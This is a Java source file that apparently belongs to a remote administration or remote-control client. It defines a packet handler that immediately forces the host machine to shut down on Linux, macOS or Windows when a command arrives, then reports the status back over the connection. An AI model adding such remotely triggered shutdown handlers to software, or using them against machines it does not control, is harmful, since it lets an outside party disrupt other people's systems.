package com.redpois0n.packets;

import com.redpois0n.Connection;
import com.redpois0n.Constants;

public class PacketSHUTDOWN extends Packet{

	@Override
	public void read(String line) throws Exception {
		String operatingSystem = System.getProperty("os.name");
		if (operatingSystem.toLowerCase().contains("linux") || operatingSystem.toLowerCase().contains("mac")) {
			Runtime.getRuntime().exec("shutdown -h now");
			Connection.status(Constants.STATUS_STARTING_SHUTDOWN);
		} else if (operatingSystem.toLowerCase().contains("windows")) {
			Runtime.getRuntime().exec("shutdown.exe -s -t 0");
			Connection.status(Constants.STATUS_STARTING_SHUTDOWN);
		} else {
			Connection.status(Constants.STATUS_FAILED_SHUTDOWN);
		}
	}

}
